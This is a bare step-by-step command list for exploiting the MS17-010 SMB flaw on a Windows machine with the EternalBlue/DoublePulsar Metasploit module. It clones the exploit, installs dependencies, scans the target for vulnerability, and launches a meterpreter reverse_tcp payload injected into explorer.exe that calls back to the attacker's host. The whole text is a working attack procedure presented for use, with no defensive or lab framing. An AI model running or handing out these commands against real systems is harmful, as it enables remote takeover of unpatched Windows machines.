Commands :

cd Desktop
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
dpkg –add-architecture i386
apt-get update
apt-get dist-upgrade
apt-get install wine32
mkdir -p /root/.wine/drive_c/
Open metasploit framework from the terminal via command “msfconsole” , when it loads up properly, close the terminal window.
mkdir -p /root/.msf4/modules/exploits/windows/smb/
cp /root/Eternalblue-Doublepulsar-Metasploit/deps/ /root/.msf4/modules/exploits/windows/smb/
cp /root/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /root/.msf4/modules/exploits/windows/smb/
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOST IP-Address-of-Windows-Machine
run
If it says that it is vulnerable then proceed further.
back
use exploit/windows/smb/eternalblue_doublepulsar
set payload windows/x64/meterpreter/reverse_tcp
set PROCESSINJECT explorer.exe
set RHOST IP-Address-of-Windows-Machine
set TARGETARCHITECTURE x86-or-x64
set LHOST IP-Address-of-Kali-Linux
exploit
